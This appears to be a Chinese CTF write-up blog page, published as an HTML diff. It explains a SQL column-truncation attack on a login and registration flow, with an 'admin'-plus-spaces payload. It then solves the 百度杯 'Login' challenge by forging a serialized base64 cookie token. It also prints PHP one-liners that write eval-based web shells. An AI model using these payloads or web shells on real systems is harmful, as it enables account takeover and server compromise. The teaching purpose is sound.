@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d8f3ff">
+<title>令人窒息的登录题</title>
+
+  <style>
+    :root { --wallpaper: url("/images/wallpaper.jpg"); }
+  </style>
+
+<link rel="stylesheet" href="/css/main.css">
+<script defer src="/js/main.js"></script>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<body class="theme-mac js is-article-page has-wallpaper">
+  <div class="menu-bar">
+  <div class="menu-left">
+    <div class="menu-apple" id="menu-apple">
+      <button class="menu-apple-btn" id="menu-apple-btn" type="button" aria-haspopup="true" aria-expanded="false" aria-label="Apple">
+        <svg class="menu-apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+          <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+        </svg>
+      </button>
+      <div class="menu-dropdown" id="menu-apple-dropdown" role="menu">
+        <button class="menu-dropdown-item" type="button" data-open="about">关于本机</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">系统设置...</button>
+        <button class="menu-dropdown-item" type="button">App Store...</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">关机...</button>
+      </div>
+    </div>
+    <span class="menu-item brand">Finder</span>
+    <span class="menu-item">File</span>
+    <span class="menu-item">Edit</span>
+    <span class="menu-item">View</span>
+    <span class="menu-item">Go</span>
+    <span class="menu-item">Window</span>
+    <span class="menu-item">Help</span>
+  </div>
+  <div class="menu-right">
+    <span class="menu-item status icon" aria-label="WeChat" title="WeChat">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M8.5 6.5c-3.2 0-5.8 2.1-5.8 4.8 0 1.7 1 3.3 2.6 4.2l-.6 2.3 2.3-1.2c.5.1 1 .2 1.5.2 3.2 0 5.8-2.1 5.8-4.8S11.7 6.5 8.5 6.5z"/>
+        <path d="M15.5 11c3.1 0 5.7 2.1 5.7 4.7 0 1.5-.8 2.9-2.2 3.8l.5 2-2.1-1.1c-.4.1-.9.1-1.4.1-3.1 0-5.7-2.1-5.7-4.7S12.4 11 15.5 11z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="QQ" title="QQ">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 18c-1.4 0-2.6 1-2.6 2.3 0 1.1 1 2.1 2.6 2.1h10c1.6 0 2.6-1 2.6-2.1 0-1.3-1.2-2.3-2.6-2.3"/>
+        <path d="M6.5 12.5c-1.2 2.1-1.7 4.2-1.7 5.5M17.5 12.5c1.2 2.1 1.7 4.2 1.7 5.5"/>
+        <path d="M12 4.2c-3.6 0-6.5 3-6.5 6.7 0 3.7 2.9 6.7 6.5 6.7s6.5-3 6.5-6.7c0-3.7-2.9-6.7-6.5-6.7z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Bluetooth" title="Bluetooth">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 6l10 10-5 4V4l5 4-10 10"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Wi-Fi" title="Wi-Fi">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M3.5 9.5a12 12 0 0 1 17 0"/>
+        <path d="M6.8 12.8a7.2 7.2 0 0 1 10.4 0"/>
+        <path d="M10.4 16.4a2.6 2.6 0 0 1 3.2 0"/>
+        <circle cx="12" cy="19" r="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Battery" title="Battery">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <rect x="3" y="7.5" width="16" height="9" rx="2"/>
+        <rect x="19" y="10" width="2" height="4" rx="1"/>
+        <rect x="5.2" y="9.6" width="11.4" height="4.8" rx="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item" id="menu-time">--:--</span>
+  </div>
+</div>
+
+
+  <main class="desktop">
+    <div class="window wide reveal" style="--delay: 120ms;">
+      <div class="window-bar">
+        <div class="traffic">
+          <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+          <span class="traffic-dot yellow"></span>
+          <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+        </div>
+        <div class="window-title">令人窒息的登录题</div>
+        <div class="window-actions">
+          <a class="window-link" href="/">Desktop</a>
+          
+          
+            <a class="window-link" href="/2019/08/10/%E4%B9%8B%E5%89%8D%E7%9A%84/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E7%99%BB%E5%BD%95%E9%A2%98/" target="_blank" rel="noopener">Share</a>
+          
+        </div>
+      </div>
+      <div class="window-body">
+        
+        <div class="article-head">
+          <h1 class="article-title">令人窒息的登录题</h1>
+          
+            <div class="article-meta">2019-08-10</div>
+          
+        </div>
+        <article class="markdown">
+          <h4 id="一、约束攻击"><a href="#一、约束攻击" class="headerlink" title="一、约束攻击"></a>一、约束攻击</h4><p>假如有这么一个登录注册业务<br>注册</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Checking whether a user with the same username exists</span></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users  WHERE username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// User exists, exit gracefully</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// If not, only then insert a new entry</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users(username, password) VALUES (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+<p>登录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT username FROM users</span></span><br><span class="line"><span class="string">          WHERE username=&#x27;<span class="subst">$username</span>&#x27;</span></span><br><span class="line"><span class="string">              AND password=&#x27;<span class="subst">$password</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$res</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Null;</span><br></pre></td></tr></table></figure>
+<p>发生原因<br>1.mysql处于ANSI模式。如果是TRADITIONAL模式或者STRICT_TRANS_TABLES模式会报错data too long for column。<br>2.服务端没有对用户名长度进行限制。如果服务端限制了用户名长度就自然就不客能导致数据库截断，也就没有利用条件。<br>3.登陆验证的SQL语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码然后再比对密码，当使用vampire为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条即目标用户的记录，那么传输的密码肯定和目标用户密码匹配不上的。<br>4.验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户vampire和密码random_pass登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是vampire+若干个空格，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。<br>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册一个账号为admin                        1 </span><br><span class="line">密码随意即可登录获取flag</span><br></pre></td></tr></table></figure>
+<p>写入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;index1.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[c]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;aka.php&quot;</span>,<span class="string">&quot;&lt;?php eval(\$_POST[aka]);?&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="百度杯”CTF比赛-十月场-—–Login"><a href="#百度杯”CTF比赛-十月场-—–Login" class="headerlink" title="百度杯”CTF比赛 十月场 —–Login"></a>百度杯”CTF比赛 十月场 —–Login</h4><p>先test1,test1登录，请求头中有个show:0改成1，看到代码，就是代码审计咯</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$requset</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_SESSION</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$where</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;where))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;where);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$where</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;select * from user where &#x27;</span>.<span class="variable">$where</span>);</span><br><span class="line">            <span class="keyword">return</span> @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$requset</span>[<span class="string">&#x27;token&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$login</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$requset</span>[<span class="string">&#x27;token&#x27;</span>])));</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">db</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;user=\&#x27;&#x27;</span>.<span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$login</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$login</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="string">&#x27;ichunqiu&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>] !== <span class="variable">$login</span>[<span class="string">&#x27;pass&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;unserialize injection!!&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;(â¯âµâ¡â²)â¯ï¸µâ´ââ´ &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?error=1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p>得知要得到flag需要满足 $login[‘user’] &#x3D;&#x3D;&#x3D; ‘ichunqiu’</p>
+<p>而user被$login &#x3D; unserialize(gzuncompress(base64_decode($requset[‘token’])));处理过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;user&#x27;</span>=&gt;<span class="string">&#x27;ichunqiu&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到<code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code><br>抓包将cookie中加一个<code>token=eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code><br>有一点很头疼，为啥直接在get请求中加不行么,一定要token中</p>
+
+        </article>
+      </div>
+    </div>
+  </main>
+
+  <section id="about" class="about-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">关于本机</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body about-body">
+      <div class="about-card">
+        <div class="about-brand">
+          <div class="about-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+              <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+            </svg>
+          </div>
+          <div class="about-title">MacBook Pro</div>
+          <div class="about-sub">16-inch, 2099</div>
+        </div>
+        <div class="about-specs">
+          <div class="about-row">
+            <span class="about-key">内存</span>
+            <span class="about-val">256 GB 2667 MHz DDR4</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">处理器</span>
+            <span class="about-val">Apple M9 Pro</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">显卡</span>
+            <span class="about-val">Neural X 32-Core</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">序列号</span>
+            <span class="about-val">MACF-2099-A1B2C3</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">系统</span>
+            <span class="about-val">macOS 15.2</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">主题作者</span>
+            <span class="about-val">bkfish</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+  
+
+<section id="music" class="tool-window music-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">Music</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+        
+      </div>
+    </div>
+    <div class="window-body tool-body music-body">
+      
+        <div class="empty-state">
+          <div class="empty-title">未发现本地音乐</div>
+          <div class="empty-sub">把 MP3 放在 `source/music/`（或在主题配置里设置 `desktop.music_dir`）</div>
+        </div>
+      
+    </div>
+  </div>
+</section>
+
+  <section id="search" class="search-window" data-index-url="/mac-search.json">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+    <div class="window-title">聚焦搜索</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body search-body">
+      <div class="search-input-wrap">
+        <input id="search-input" class="search-input" type="search" placeholder="搜索文章..." autocomplete="off">
+        <span class="search-hint">⌘K</span>
+      </div>
+      <ul id="search-results" class="search-results"></ul>
+      <div id="search-empty" class="search-empty">未找到结果</div>
+    </div>
+  </div>
+</section>
+
+  <div class="dock">
+  <div class="dock-inner">
+    <span class="dock-item app finder">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M4 6.5c0-1.4 1.1-2.5 2.5-2.5h11c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-11C5.1 20 4 18.9 4 17.5z"/>
+          <path d="M12 4v16"/>
+          <circle cx="9" cy="10" r="1" fill="currentColor"/>
+          <circle cx="15" cy="10" r="1" fill="currentColor"/>
+          <path d="M8.5 14.5c1 1 2.1 1.5 3.5 1.5s2.5-.5 3.5-1.5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Finder</span>
+    </span>
+    <a class="dock-item app spotlight" href="#search">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="11" cy="11" r="5.5"/>
+          <path d="M15.5 15.5L20 20"/>
+        </svg>
+      </span>
+      <span class="dock-label">聚焦搜索</span>
+    </a>
+    <a class="dock-item app notes" href="#notes">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <rect x="5" y="4.5" width="14" height="15" rx="2"/>
+          <path d="M8 8h8M8 11.5h8M8 15h5"/>
+        </svg>
+      </span>
+      <span class="dock-label">文章清单</span>
+    </a>
+    <span class="dock-item app safari">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="8"/>
+          <path d="M12 7l2.8 5.2-5.2 2.8z"/>
+        </svg>
+      </span>
+      <span class="dock-label">Safari</span>
+    </span>
+    <a class="dock-item app music" href="#music">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M9 18a2.5 2.5 0 1 0 0-5"/>
+          <path d="M9 13V6l9-2v7"/>
+          <path d="M16 16a2.5 2.5 0 1 0 0-5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Music</span>
+    </a>
+    <span class="dock-item app trash">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6 8h12l-1 11H7z"/>
+          <path d="M9 8V5h6v3M5 8h14"/>
+        </svg>
+      </span>
+      <span class="dock-label">Trash</span>
+    </span>
+    <span class="dock-divider"></span>
+    
+    
+      
+      <a class="dock-item tool" href="#tool-flag">
+        <span class="dock-icon">
+          <span class="tool-letter">F</span>
+        </span>
+        <span class="dock-label">flag</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-bomb">
+        <span class="dock-icon">
+          <span class="tool-letter">B</span>
+        </span>
+        <span class="dock-label">bomb</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-sudoku">
+        <span class="dock-icon">
+          <span class="tool-letter">S</span>
+        </span>
+        <span class="dock-label">sudoku</span>
+      </a>
+    
+  </div>
+</div>
+
+
+  <!-- embed resize script removed: fixed-height iframe -->
+</body>
+</html>
